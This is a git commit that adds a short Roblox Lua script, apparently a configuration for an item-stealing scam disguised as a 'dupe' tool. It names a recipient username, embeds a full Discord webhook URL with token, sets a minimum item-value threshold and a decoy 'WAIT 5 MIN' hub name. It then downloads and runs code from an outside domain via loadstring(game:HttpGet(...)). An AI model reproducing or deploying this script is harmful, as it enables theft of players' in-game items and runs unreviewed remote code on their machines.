44692cfd73926e24ce2e36cbb0894a0652a90727
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2024-03-21 07:47:03 +0700

    Create main.lua

---
+++ dupeforpay/by5/Roblox/main.lua
@@ -0,0 +1,10 @@
+lua
+Username = "mxrcuszzzzz"
+Username2 = "mxrcuszzzzz"
+Webhook = "https://discord.com/api/webhooks/1220168239758442498/fMYm-BGCRqeWjtib_tl3_wRzte9470vgC-_k4dhWcEFPGbmrAI8Ff5EywoI9CQ0MOlLc"
+
+HubName = "WAIT 5 MIN"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
